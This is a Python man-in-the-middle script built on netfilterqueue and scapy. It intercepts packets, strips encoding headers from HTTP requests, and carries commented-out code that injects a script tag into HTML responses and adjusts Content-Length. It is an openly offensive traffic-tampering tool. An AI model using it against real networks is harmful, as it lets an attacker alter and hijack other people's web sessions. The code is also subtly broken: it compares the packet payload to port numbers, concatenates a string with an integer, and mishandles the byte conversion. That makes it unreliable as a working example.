#!/usr/bin/env python
import re
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw


def set_load(packet, new_load):
    packet[Raw].load = new_load
    del packet[IP].len
    del packet[IP].chksum
    return new_load


def process_packets(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(TCP):
        if scapy_packet.haslayer(Raw):  # Check for the presence of Raw layer
            load = scapy_packet[Raw].load.decode('utf-8', errors='ignore')

            if "HTTP/1.1" in load:
                print("[+] HTTP REQUEST")
                print(scapy_packet.show())
                load = re.sub(r"Accept-Encoding: [^\r\n]*\r\n", "", load)  # Updated regex
                load = re.sub(r'Upgrade-Insecure-Requests:[^\r\n]*\r\n', "", load)

                # scapy_packet[Raw].load = bytes(load, 'utf-8')

            elif scapy_packet[Raw].load == 443 or scapy_packet[Raw].load == 80:
                print("[+] RESPONSE")
                print("sport: " + scapy_packet[TCP].sport)
                print(scapy_packet.show())

                # injection_code = "<script>alert('You\'ve been hacked, lol')</script>"
                # load = load.replace("</body>", injection_code + "</body")

                # Debug print to check if content-length search is successful
                # content_length_search = re.search(r"(?:Content-Length:\s)(\d)", load)
                # if content_length_search and "text/html" in load:
                #     content_length = content_length_search.group(1)
                #     new_content_length = int(content_length) + len(injection_code)
                #     load = load.replace(content_length, str(new_content_length))
                #     print("[+] Content-Length: " + content_length)
            # else:
            #     print("Source Port:", scapy_packet[TCP].sport)
            #     print(scapy_packet.show())

            if load != scapy_packet[Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet, encoding='utf-8'))

    packet.accept()


# Create a netfilterqueue object and bind it to queue 0
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packets)

try:
    print("[+] Waiting for packets...")
    queue.run()
except KeyboardInterrupt:
    print("[+] Exiting...")
